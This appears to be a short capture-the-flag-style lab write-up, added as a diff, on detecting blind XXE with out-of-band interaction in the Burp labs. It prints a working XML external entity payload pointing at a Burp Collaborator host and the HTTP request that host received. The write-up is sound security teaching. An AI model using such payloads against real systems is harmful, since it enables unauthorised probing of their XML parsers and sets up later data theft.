@@ -1,0 +1,14 @@
+Blind XXE with out-of-band interaction
+
+This time we're dealing with a blind XXE attack, so we need to find a way to confirm that it works. Solution provided by Burp Labs is great.
+We do this by adding the address of a system we own in the payload, instead of the local system. We'll use Burp Collaborator for this.
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://lwlwd10budkku921sowrjq5tpkvajz.burpcollaborator.net"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+and we get a request sent to Collaborator:
+GET / HTTP/1.1
+User-Agent: Java/11.0.1
+Host: lwlwd10budkku921sowrjq5tpkvajz.burpcollaborator.net
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
